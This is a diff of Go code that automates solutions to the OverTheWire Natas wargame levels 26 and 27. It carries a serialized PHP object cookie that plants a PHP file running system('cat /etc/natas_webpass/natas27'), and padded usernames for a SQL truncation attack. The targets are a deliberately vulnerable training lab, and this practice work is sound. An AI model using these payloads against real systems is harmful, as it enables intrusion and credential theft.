@@ -574,9 +574,9 @@ func Init() {
 	Solutions = append(Solutions, func(username string, password string) string {
 		req, _ := http.NewRequest("GET", "http://natas26.natas.labs.overthewire.org/", nil)
 		req.SetBasicAuth(username, password)
-		req.AddCookie(&http.Cookie{Name: "drawing", Value: "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Rlc3QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoiSGkKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTE6Ijw/IHBhc3N0aHJ1KCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KCiI7fQ=="})
+		req.AddCookie(&http.Cookie{Name: "drawing", Value: "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MDoiaW1nLzJlNDQzM2YxMmI4M2IyM2ZmNTAzOGFlYjc2NDYwMWU1LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTA6Ijw/cGhwIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9"})
 		http.DefaultClient.Do(req)
-		req, _ = http.NewRequest("GET", "http://natas26.natas.labs.overthewire.org/img/test.php", nil)
+		req, _ = http.NewRequest("GET", "http://natas26.natas.labs.overthewire.org/img/2e4433f12b83b23ff5038aeb764601e5.php", nil)
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
@@ -589,11 +589,11 @@ func Init() {
 
 	//Natas27
 	Solutions = append(Solutions, func(username string, password string) string {
-		req, _ := http.NewRequest("POST", "http://natas27.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("username=natas28                                                               test&password=testing")))
+		req, _ := http.NewRequest("POST", "http://natas27.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("username=natas28                                                         .&password=testing")))
 		req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
 		req.SetBasicAuth(username, password)
 		http.DefaultClient.Do(req)
-		req, _ = http.NewRequest("POST", "http://natas27.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("username=natas28&password=testing")))
+		req, _ = http.NewRequest("POST", "http://natas27.natas.labs.overthewire.org/", bytes.NewBuffer([]byte("username=natas28                                                         &password=testing")))
 		req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
